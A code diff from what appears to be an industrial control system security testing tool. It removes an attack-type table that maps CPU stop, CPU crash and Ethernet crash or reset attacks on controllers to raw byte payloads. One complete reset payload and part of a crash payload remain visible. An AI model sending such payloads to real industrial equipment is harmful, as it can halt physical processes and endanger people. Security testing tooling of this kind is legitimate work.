@@ -38,22 +38,6 @@ ATTACK_CRASHETHER_PAYLOAD = b"\xb2\x00\x0c\x00\x0e\x03\x20\xf5\x24\x01\x10\x43\x
 # Targets Identity Object (0x01) with Reset service
 ATTACK_RESETETHER_PAYLOAD = b"\xb2\x00\x08\x00\x05\x03\x20\x01\x24\x01\x30\x03"
 
-# Attack type enumeration for logging and reporting
-ATTACK_TYPES = {
-    "stopcpu": {"payload": ATTACK_STOPCPU_PAYLOAD, "name": "CPU STOP", "destructive": True},
-    "crashcpu": {"payload": ATTACK_CRASHCPU_PAYLOAD, "name": "CPU CRASH", "destructive": True},
-    "crashether": {
-        "payload": ATTACK_CRASHETHER_PAYLOAD,
-        "name": "Ethernet CRASH",
-        "destructive": True,
-    },
-    "resetether": {
-        "payload": ATTACK_RESETETHER_PAYLOAD,
-        "name": "Ethernet RESET",
-        "destructive": False,
-    },
-}
-
 # Dangerous tag patterns for safety analysis
 DANGEROUS_TAG_PATTERNS = [
     r".*SAFETY.*",
@@ -75,6 +59,5 @@ __all__ = [
     "ATTACK_CRASHCPU_PAYLOAD",
     "ATTACK_CRASHETHER_PAYLOAD",
     "ATTACK_RESETETHER_PAYLOAD",
-    "ATTACK_TYPES",
     "DANGEROUS_TAG_PATTERNS",
 ]
